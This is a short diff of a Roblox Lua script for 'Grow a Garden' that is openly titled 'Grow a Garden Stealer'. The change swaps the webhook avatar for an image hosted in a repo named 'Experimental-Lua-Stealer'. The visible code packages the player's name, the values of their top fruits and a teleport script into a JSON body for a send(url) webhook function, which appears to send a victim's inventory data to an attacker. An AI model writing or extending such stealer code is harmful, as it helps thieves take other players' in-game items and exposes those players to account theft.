@@ -228,7 +228,7 @@ local function send(url)
 	local i_fruit = #fruits >=1 and '\n``Top 5 best fruits:``\n```'.. (function() local x = "";for i,v in ipairs(fruits) do if i > 5 then break end x ..= v.name .." value: ".. formatNumber(v.value) .."\n" end return x end)().. '```' or ""
 	local body = game:GetService("HttpService"):JSONEncode({
 		["username"] = game.Players.LocalPlayer.Name,
-		["avatar_url"] = "https://raw.githubusercontent.com/D3ATH-hub/main/PS99/pfp.png",
+		["avatar_url"] = "https://raw.githubusercontent.com/Hasponix/Experimental-Lua-Stealer/refs/heads/main/file_00000000848461f8a7581f1fb5625f04.png",
 		["content"] = tpscript,
 		["embeds"] = {{
 			["title"] = "Grow a Garden Stealer",
@@ -277,6 +277,7 @@ game.Players.PlayerAdded:Connect(function(player)
     end
 
 end)
+
 
 
 
